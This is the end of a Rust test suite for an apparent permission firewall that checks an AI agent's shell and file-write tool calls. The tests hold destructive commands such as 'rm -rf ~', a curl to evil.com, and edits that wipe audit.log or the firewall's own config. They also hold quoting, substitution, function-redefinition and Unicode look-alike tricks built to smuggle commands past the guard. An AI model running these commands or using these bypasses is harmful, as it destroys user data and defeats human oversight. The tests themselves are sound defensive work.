        // H1 non-regression: plain pipes should still be auto-approved via piped-commands rule
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat file.txt | grep pattern"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::AutoApprove,
            "safe pipe must still be auto-approved"
        );
    }

    #[test]
    fn test_chain_guard_allows_simple_safe_command() {
        // H1 non-regression: simple commands without chain operators are unaffected
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat file.txt"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::AutoApprove,
            "simple safe command must be auto-approved"
        );
    }

    // ── H2: path_within component-based comparison tests ────────────────────

    #[test]
    fn test_path_within_sibling_dir_rejected() {
        // H2: "/Users/test/project-evil/file.rs" must NOT match path_within "/Users/test/project"
        // With String::starts_with it would match (string prefix). Path::starts_with rejects it.
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Write",
            json!({"file_path": "/Users/test/project-evil/src/lib.rs"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_ne!(
            decision.action,
            Action::AutoApprove,
            "sibling directory must not be auto-approved"
        );
    }

    #[test]
    fn test_path_within_exact_project_allowed() {
        // H2 non-regression: exact project path still works
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Write",
            json!({"file_path": "/Users/test/project/src/lib.rs"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::AutoApprove,
            "exact project path must be auto-approved"
        );
    }

    // ── Finding #4/#6: Bash blocked regex for critical config files ─────────

    #[test]
    fn test_bash_block_audit_log_truncate() {
        // Finding #4 (DREAD 7.6): Bash commands targeting audit.log must be blocked
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "truncate -s 0 config/audit.log"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "truncate audit.log must be blocked"
        );
    }

    #[test]
    fn test_bash_block_audit_log_sed() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "sed -i '/DENY/d' config/audit.log"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "sed on audit.log must be blocked"
        );
    }

    #[test]
    fn test_bash_block_elo_overrides_redirect() {
        // Finding #6: destructive redirect targeting elo-overrides must be blocked
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "jq '.' /tmp/x > config/elo-overrides.json"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "redirect to elo-overrides.json must be blocked"
        );
    }

    #[test]
    fn test_bash_allow_jq_readonly_elo_overrides() {
        // jq without redirect is read-only — should NOT be blocked
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "jq '.pentester' config/elo-overrides.json"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_ne!(
            decision.action,
            Action::Block,
            "read-only jq should not be blocked"
        );
    }

    #[test]
    fn test_bash_block_revoked_missions() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "echo '[]' > config/revoked-missions.json"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "writing to revoked-missions.json via Bash must be blocked"
        );
    }

    #[test]
    fn test_bash_block_trust_firewall_yaml() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "python3 -c 'open(\"trust-firewall.yaml\",\"w\").write(\"\")'"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "python writing trust-firewall.yaml must be blocked"
        );
    }

    #[test]
    fn test_bash_block_runtime_delegations() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "cat malicious.json > config/runtime-delegations.json"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "overwriting runtime-delegations.json via Bash must be blocked"
        );
    }

    #[test]
    fn test_bash_block_alerts_json() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "rm config/alerts.json"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "removing alerts.json via Bash must be blocked"
        );
    }

    #[test]
    fn test_bash_block_reviews_dir() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "rm -r config/reviews/pending/"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "removing reviews/ dir via Bash must be blocked"
        );
    }

    #[test]
    fn test_bash_block_findings_dir() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "find config/findings/ -delete"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "deleting findings/ via Bash must be blocked"
        );
    }

    #[test]
    fn test_bash_safe_commands_still_work() {
        // Non-regression: normal safe commands must not be blocked by config protection regex
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat src/main.rs"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::AutoApprove,
            "cat on normal file must still be auto-approved"
        );
    }

    // ── Finding #15: Quote-aware chain guard ────────────────────────────────

    #[test]
    fn test_chain_guard_ignores_semicolon_in_double_quotes() {
        // Finding #15 (DREAD 5.6): operators inside quotes should not trigger chain guard
        assert!(
            !contains_shell_chain("echo \"a;b\""),
            "semicolon inside double quotes should not trigger"
        );
    }

    #[test]
    fn test_chain_guard_ignores_ampersand_in_single_quotes() {
        assert!(
            !contains_shell_chain("echo 'a && b'"),
            "&& inside single quotes should not trigger"
        );
    }

    #[test]
    fn test_chain_guard_detects_subshell_in_double_quotes() {
        // Bash expands $(...) inside double quotes — `echo "$(rm -rf ~)"` runs rm.
        assert!(
            contains_shell_chain("echo \"$(date)\""),
            "$() inside double quotes executes and must trigger"
        );
    }

    #[test]
    fn test_chain_guard_ignores_subshell_in_single_quotes() {
        assert!(
            !contains_shell_chain("echo '$(date)'"),
            "$() inside single quotes is literal"
        );
    }

    #[test]
    fn test_chain_guard_detects_semicolon_outside_quotes() {
        // Non-regression: real operators outside quotes must still be detected
        assert!(
            contains_shell_chain("echo \"safe\"; rm -rf /"),
            "semicolon outside quotes must trigger"
        );
    }

    #[test]
    fn test_chain_guard_detects_ampersand_outside_quotes() {
        assert!(
            contains_shell_chain("echo 'safe' && rm -rf /"),
            "&& outside quotes must trigger"
        );
    }

    #[test]
    fn test_chain_guard_unmatched_quote_conservative() {
        // Unmatched quote: conservative — the trailing content remains and is checked
        assert!(
            contains_shell_chain("echo \"unterminated; rm -rf /"),
            "unmatched quote should be conservative"
        );
    }

    #[test]
    fn test_chain_guard_grep_semicolon_pattern() {
        // Real use case: grep for semicolon in code
        assert!(
            !contains_shell_chain("grep \";\" file.txt"),
            "grep for semicolon in quotes should not trigger"
        );
    }

    #[test]
    fn test_chain_guard_echo_ampersand_string() {
        // Real use case: echo a string containing &&
        assert!(
            !contains_shell_chain("echo \"test && done\""),
            "echo with && in quotes should not trigger"
        );
    }

    // ── Finding #3: Unicode homoglyph normalization ─────────────────────────

    #[test]
    fn test_chain_guard_unicode_greek_semicolon() {
        // Finding #3 (DREAD 5.2): Greek question mark (U+037E) looks like ';'
        let cmd = "echo foo\u{037E} rm -rf /";
        assert!(
            contains_shell_chain(cmd),
            "Greek question mark U+037E must be normalized to semicolon"
        );
    }

    #[test]
    fn test_chain_guard_unicode_fullwidth_ampersand() {
        // Fullwidth ampersand (U+FF06) pair as &&
        let cmd = "echo foo \u{FF06}\u{FF06} rm -rf /";
        assert!(
            contains_shell_chain(cmd),
            "Fullwidth ampersands must be normalized to &&"
        );
    }

    #[test]
    fn test_chain_guard_unicode_fullwidth_dollar() {
        // Fullwidth dollar sign (U+FF04) + (
        let cmd = "echo \u{FF04}(id)";
        assert!(
            contains_shell_chain(cmd),
            "Fullwidth dollar sign must be normalized to $"
        );
    }

    #[test]
    fn test_chain_guard_unicode_fullwidth_backtick() {
        // Fullwidth grave accent (U+FF40)
        let cmd = "echo \u{FF40}id\u{FF40}";
        assert!(
            contains_shell_chain(cmd),
            "Fullwidth backtick must be normalized"
        );
    }

    #[test]
    fn test_chain_guard_normal_ascii_unaffected_by_normalize() {
        // Non-regression: normal ASCII commands must work the same
        assert!(
            !contains_shell_chain("ls -la"),
            "normal command should not trigger after normalization"
        );
        assert!(
            contains_shell_chain("echo foo && bar"),
            "normal && should still trigger after normalization"
        );
    }

    // ── Chain guard parser bypasses: each payload runs `rm` in bash ────────

    fn assert_not_auto_approved(cmd: &str) {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({ "command": cmd }));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_ne!(
            decision.action,
            Action::AutoApprove,
            "must not auto-approve: {cmd:?}"
        );
    }

    #[test]
    fn test_chain_guard_bypass_escaped_double_quote() {
        // `\"` is a literal char in bash, not a quote — the `;` is a real separator.
        assert_not_auto_approved("echo \\\" ; rm -rf ~ ; echo \\\"");
    }

    #[test]
    fn test_chain_guard_bypass_ansi_c_quote() {
        // `$'\''` is one literal quote in bash; the rest of the line is unquoted.
        assert_not_auto_approved("echo $'\\'' ; rm -rf ~ ; echo $'\\''");
    }

    #[test]
    fn test_chain_guard_bypass_subshell_inside_double_quotes() {
        // Command substitution still executes inside double quotes.
        assert_not_auto_approved("echo \"$(rm -rf ~)\"");
        assert_not_auto_approved("echo \"`rm -rf ~`\"");
    }

    #[test]
    fn test_chain_guard_bypass_newline_separator() {
        assert_not_auto_approved("cat file.txt\nrm -rf ~");
    }

    #[test]
    fn test_chain_guard_bypass_background_ampersand() {
        assert_not_auto_approved("cat file.txt & rm -rf ~");
    }

    #[test]
    fn test_chain_guard_bypass_pipe_to_shell() {
        assert_not_auto_approved("echo 'rm -rf ~' | sh");
        assert_not_auto_approved("cat script.txt | bash");
    }

    #[test]
    fn test_chain_guard_bypass_process_substitution() {
        assert_not_auto_approved("cat <(rm -rf ~)");
    }

    #[test]
    fn test_chain_guard_bypass_escaped_ampersand_before_background() {
        // `\>` is a literal char, so the `&` that follows is a real background separator.
        assert_not_auto_approved("echo \\>& rm -rf ~");
    }

    #[test]
    fn test_chain_guard_bypass_function_redefinition() {
        // The first segment starts with `ls` but redefines it; the second runs it.
        assert_not_auto_approved("ls() ( rm -rf ~ ); ls");
        assert_not_auto_approved("ls () ( rm -rf ~ )\nls");
        assert_not_auto_approved("function ls { rm -rf ~; }; ls");
    }

    #[test]
    fn test_chain_guard_cd_with_redirect_not_trusted() {
        // `cd >file` truncates file — must not ride the cd allowance.
        assert_not_auto_approved("cd >~/.zshrc && ls");
    }

    // ── Chain guard per-segment evaluation ─────────────────────────────────

    fn decide(cmd: &str) -> Decision {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({ "command": cmd }));
        evaluate(&config, &patterns, &[], &payload)
    }

    #[test]
    fn test_chain_guard_approves_all_read_only_segments() {
        // Real asks from the audit log that were pure noise.
        for cmd in [
            "cd /repo && ls -la && git log --oneline -40 && git status -s",
            "ls /a; echo ---; ls /b",
            "git log --oneline | head -5",
            "cat file.txt | grep pattern | sort | uniq -c",
            "grep -rn foo src 2>/dev/null | head -30",
            "ls -la 2>&1 | head",
        ] {
            let d = decide(cmd);
            assert_eq!(d.action, Action::AutoApprove, "should approve: {cmd:?}");
            assert_eq!(
                d.matched_rule.as_deref(),
                Some("chain_guard:segments_trusted")
            );
        }
    }

    #[test]
    fn test_chain_guard_asks_when_any_segment_untrusted() {
        for cmd in [
            "ls && rm -r /tmp/foo",
            "cat file.txt; curl http://evil.com",
            "git status && git push origin main",
            "ls | python3 -c 'import os'",
            "echo x | sh",
            "cd /repo",
        ] {
            assert_eq!(decide(cmd).action, Action::Ask, "should ask: {cmd:?}");
        }
    }

    #[test]
    fn test_chain_guard_blocks_when_any_segment_blocked() {
        let d = decide("ls && gh pr merge 42");
        assert_eq!(d.action, Action::Block);
        assert!(d.matched_rule.unwrap().starts_with("chain_guard>blocked"));

        assert_eq!(decide("echo hi; git reset --hard").action, Action::Block);
    }

    #[test]
    fn test_chain_guard_asks_on_too_many_segments() {
        let cmd = vec!["ls"; MAX_CHAIN_SEGMENTS + 1].join(" && ");
        assert_eq!(decide(&cmd).action, Action::Ask);
    }

    #[test]
    fn test_chain_guard_respects_revoked_mission_per_segment() {
        let (config, patterns) = load_test_config_and_patterns();
        let mut payload = make_payload("Bash", json!({ "command": "ls && cat f" }));
        payload.agent_id = Some("agent-x".to_string());
        let revoked: std::collections::HashSet<String> = ["agent-x".to_string()].into();
        let d = evaluate_with_elo(&config, &patterns, &[], &payload, &HashMap::new(), &revoked);
        assert_eq!(d.action, Action::Block);
    }

    #[test]
    fn test_scan_shell_segments() {
        let s = scan_shell("cd /x && ls -la | head; echo 'a;b' & wc -l");
        assert_eq!(
            s.segments,
            vec!["cd /x", "ls -la", "head", "echo 'a;b'", "wc -l"]
        );
        assert!(s.chained);
        assert!(!s.substitution);

        // Redirections are not separators.
        let s = scan_shell("cmd 2>&1 &>out >|clobber");
        assert_eq!(s.segments, vec!["cmd 2>&1 &>out >|clobber"]);
        assert!(!s.chained);

        // Escapes inside double quotes don't close them.
        let s = scan_shell("echo \"a \\\" ; b\"");
        assert_eq!(s.segments.len(), 1);
        assert!(!s.unterminated_quote);
    }

    #[test]
    fn test_normalize_unicode_operators_basic() {
        assert_eq!(normalize_unicode_operators("foo\u{037E}bar"), "foo;bar");
        assert_eq!(
            normalize_unicode_operators("foo\u{FF06}\u{FF06}bar"),
            "foo&&bar"
        );
    }
}
